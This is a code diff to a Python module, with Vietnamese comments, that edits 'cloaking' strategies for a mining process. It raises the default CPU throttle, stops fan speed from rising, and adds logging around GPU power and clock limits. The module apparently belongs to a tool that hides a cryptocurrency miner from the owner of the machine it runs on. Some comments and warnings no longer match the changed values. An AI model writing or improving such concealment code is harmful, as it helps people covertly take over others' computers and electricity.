@@ -87,7 +87,7 @@ class CpuCloakStrategy(CloakStrategy):
         self.config = config
         self.cpu_resource_manager = cpu_resource_manager
 
-        self.throttle_percentage = config.get('throttle_percentage', 20)
+        self.throttle_percentage = config.get('throttle_percentage', 80)
         if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
             self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
             self.throttle_percentage = 20
@@ -200,6 +200,8 @@ class GpuCloakStrategy(CloakStrategy):
         self.config = config
         self.gpu_resource_manager = gpu_resource_manager
 
+        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring
+        
         self.throttle_percentage = config.get('throttle_percentage', 20)
         if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
             self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định 20%.")
@@ -212,8 +214,6 @@ class GpuCloakStrategy(CloakStrategy):
         if self.temperature_threshold <= 0:
             self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
             self.temperature_threshold = 80
-
-        self.fan_speed_increase = config.get('fan_speed_increase', 20)
 
     def apply(self, process: MiningProcess) -> None:
         """
@@ -233,6 +233,7 @@ class GpuCloakStrategy(CloakStrategy):
             for gpu_index in range(gpu_count):
                 current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
                 if current_pl is None:
+                    self.logger.error(f"[GPU Cloaking] Không thể lấy power limit cho GPU={gpu_index}.")
                     continue
 
             # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
@@ -244,27 +245,35 @@ class GpuCloakStrategy(CloakStrategy):
                 ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                 if ok_pl:
                     self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
+                else:
+                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")
 
                 ok_clocks = self.gpu_resource_manager.set_gpu_clocks(pid, gpu_index,
                                                                      self.target_sm_clock,
                                                                      self.target_mem_clock)
                 if ok_clocks:
                     self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => SM={self.target_sm_clock}, MEM={self.target_mem_clock} (PID={pid}).")
+                else:
+                    self.logger.error(f"[GPU Cloaking] Không thể set clocks cho GPU={gpu_index}.")
+
 
             # limit_temperature (nếu cần)
             for gpu_index in range(gpu_count):
                 if self.stop_monitoring:  # Kiểm tra cờ dừng giám sát
                     self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
                     break
+                
+                # Reset success_temp cho mỗi GPU
                 success_temp = self.gpu_resource_manager.limit_temperature(
                     gpu_index=gpu_index,
                     temperature_threshold=self.temperature_threshold,
-                    fan_speed_increase=self.fan_speed_increase
+                    fan_speed_increase=0  # Không tăng tốc độ quạt
                 )
-            if success_temp:
-                self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
-            else:
-                self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
+                
+                if success_temp:
+                    self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
+                else:
+                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")
 
             # Chờ 10 giây trước khi kiểm tra lại
             time.sleep(60)
